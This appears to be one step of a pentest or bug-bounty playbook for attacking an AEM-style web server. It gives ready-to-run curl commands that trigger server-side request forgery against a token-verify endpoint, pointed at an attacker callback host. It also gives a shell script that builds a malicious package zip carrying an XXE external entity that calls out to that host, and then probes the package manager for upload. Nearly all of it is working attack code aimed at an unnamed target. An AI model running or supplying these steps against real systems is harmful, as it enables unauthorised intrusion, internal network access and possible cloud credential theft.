# Batch 15 — SSRF + package XXE

## FILL IN

```bash
T="https://TARGET"
QB="PASTE_QB_IF_ANY"
OAST="http://YOUR-OAST"
```

## GOAL
1) Make server call **your** URL (SSRF).  
2) Upload tiny evil zip → blind XXE callback.

## TIME
~1 hour

## YOU NEED
- OAST URL  
- Upload/SSRF allowed  

---

## WHY (30 seconds)

**SSRF** = server fetches a URL you choose (can hit cloud metadata / internal apps).  
**Package XXE** = even failed package upload may parse XML inside the zip; bad parser hits your server.  

You do not need full RCE here. Callback = proof.

---

## DO THIS

```bash
T="https://PUT-THE-SITE-HERE"
COLLAB="http://YOUR-OAST"
```

### 1) SSRF door

```bash
curl -sk -D- -X POST "$T/services/accesstoken/verify" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "auth_url=$COLLAB" | head -30
```

404? Retry with the **same URL tricks** that worked for QueryBuilder in 04–06.

Watch OAST for hit. If response body shows remote page → full-read SSRF.

### 2) Build evil zip offline

```bash
mkdir -p /tmp/evilpkg/jcr_root /tmp/evilpkg/META-INF/vault
echo -n > /tmp/evilpkg/jcr_root/empty.txt
cat > /tmp/evilpkg/META-INF/vault/privileges.xml <<EOF
<!DOCTYPE x [<!ENTITY foo SYSTEM "https://YOUR-OAST/xxe">]><x>&foo;</x>
EOF
cd /tmp/evilpkg && zip -r /tmp/evil.zip jcr_root META-INF
```

### 3) Upload if packmgr open

```bash
curl -sk -o /dev/null -w "packmgr:%{http_code}\n" "$T/crx/packmgr/index.jsp"
# Upload /tmp/evil.zip in UI or API if allowed
# Win = OAST /xxe hit even if install fails
```

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| SSRF and/or XXE callback | Document → **16** |
| Both closed | Still try **16** once; then board done |

---

## NEXT
→ [16-modern-write-el.md](./16-modern-write-el.md)
